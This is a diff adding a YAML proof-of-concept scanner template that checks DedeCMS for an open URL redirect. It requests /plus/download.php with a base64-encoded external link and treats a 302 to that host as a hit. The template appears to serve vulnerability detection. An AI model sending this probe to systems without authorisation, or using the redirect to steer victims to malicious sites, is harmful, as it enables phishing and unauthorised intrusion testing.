@@ -1,0 +1,22 @@
+id: poc-yaml-dedecms-url-redirection
+info:
+  name: Dedecms URL任意跳转漏洞
+  severity: medium
+  tags:
+  - url重定向
+  finger: Dedecms
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /plus/download.php?open=1&link=aHR0cHM6Ly93d3cuZHUxeDNyMTIuY29t
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 302 && contains(headers, "location") && contains(headers,
+    "https://www.du1x3r12.com")
+  output: []
